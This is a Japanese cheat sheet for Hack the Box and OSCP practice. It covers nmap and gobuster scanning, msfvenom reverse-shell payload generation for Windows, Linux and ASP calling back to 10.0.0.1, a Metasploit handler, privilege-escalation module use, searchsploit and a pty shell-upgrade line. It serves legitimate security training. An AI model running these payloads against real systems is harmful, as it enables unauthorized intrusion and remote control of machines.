## CheetSheet

Hack the Box の攻略や、OSCP 取得を目指すためのチートシートです。
悪用厳禁でお願いします><

日々更新していきます。

## 目次


- [Network Scan](#Network_scan)
  - [Nmap](#nmap)
- [Web Scan](#Web_scan)
- [侵入](#侵入)
  - [reverse_shell](#reverse_shell)
    - [msfvenom_reverse_shell](#msfvenom_reverse_shell)
      - Windows(meterpreter)
      - Windows(netcatなど)
      - Linux
      - ASP(msfvenom)
    - [Handlers](#Handlers)
- [特権エスカレーション](#特権エスカレーション)
  - [metasploit local_exploit_suggester](#metasploit(local_exploit_suggester))

- [便利コマンド](#便利コマンド)
    
  


# Network_scan

### Nmap

基本コマンド

```
nmap -Pn -A 10.10.10.11

-Pn : ICMPのみでなく80,443番ポートにもTCPパケットを送り、同セグメントではARPも送信しホストの存在を判断
-A : OSの種類とそのバージョンを検知


nmap -sV -sC -Pn -oN sample.txt 10.10.10.5

-sC : デフォルトスクリプトでスキャン
-sV : バージョン検出
-oN : 通常出力
```

他に

```

nmap -sV -O -F --version-light 10.10.10.3


-sV: Probe open ports to determine service/version info
-O: Enable OS detection
-F: Fast mode - Scan fewer ports than the default scan
--version-light: Limit to most likely probes (intensity 2)


集中して大量にみたいときは、
nmap -A -v 10.10.10.3

-v  冗長性をあげる

```

全 port scan

```

nmap -A -p- -Pn 10.10.10.3

-p-: 全port scan

```


 known vulnerabilitiesに対して、調査したいとき

```
ex: port 445 に対して、

nmap -Pn -p 445 --script vuln 10.10.10.4

-p: Set destination port(s)

445: The open port we've discovered earlier

--script vuln: Check for specific known vulnerabilities and generally only report results if they are found
```

[参考](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)

# Web_scan

ディレクトリスキャナー。  
隠されたディレクトリや公開範囲が間違えて設定されているものはないかを調べるために使用。

```
gobuster dir -t 100 -u <target url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o <output filename>
```

- dir...ディレクトリ総当たり
- -t...スレッド数
- -u...URL指定
- -w...wordlistの指定
- -o...ファイル出力
- -x...拡張子指定


```
実際の使用例
gobuster dir -u http://10.10.10.37 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o blocky_gobuster

```


# 侵入

## reverse_shell

### msfvenom_reverse_shell

[CheetSheet](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/)

#### Windows(meterpreter)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
```
#### Windows(netcatなど)
```
msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > reverse.exe
```

#### Linux
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
```

#### ASP(msfvenom)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp
```


#### Handlers
```
use exploit/multi/handler
set payload <payload>   (set payload windows/meterpreter/reverse_tcp など)
set LHOST <ip address>
set LPORT <port number>
run
```


# 特権エスカレーション

## metasploit(local_exploit_suggester)

[https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md)

meterpreterでシェルを手に入れている場合、local_exploit_suggesterを使うことで、特権昇格に使える exploit を探すことができる

```jsx
background

use post/multi/recon/local_exploit_suggester
```

# 便利コマンド

### searchsploit -m で、sploit を current directory へ copy

```
─$ searchsploit PRTG             
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                       | windows/webapps/46527.sh
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)                   | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                    | java/webapps/34108.txt


searchsploit -m windows/webapps/46527.sh

  -m, --mirror   [EDB-ID]    Mirror (aka copies) an exploit to the current working directory.

```

### シェル整形

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

-c: command
              Specify  the  command  to  execute.

pty: pty モジュールは擬似端末(他のプロセスを実行してその制御をしている端末をプログラムで読み書きする)
     を制御する操作を定義

pty.spawn: プロセスを生成して制御端末を現在のプロセスの標準入出力に接続する。
            これは制御端末を読もうとするプログラムをごまかすために利用される。


### ファイル探索

Windws:

```
search -f user.txt
```


### PsExec
コマンドラインを、リモートで実行できる。
[リンク](https://medium.com/@jjlovesstudying/windows-version-of-ssh-using-psexec-bff7942db91b)


### python のlibrary がない

```
ex: impacket
 
github のreleases へいき、
wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_21/impacket-0.9.21.tar.gz

tar -zxvf impacket-0.9.21.tar.gz
cd impacket-0.9.21
pip install .

```

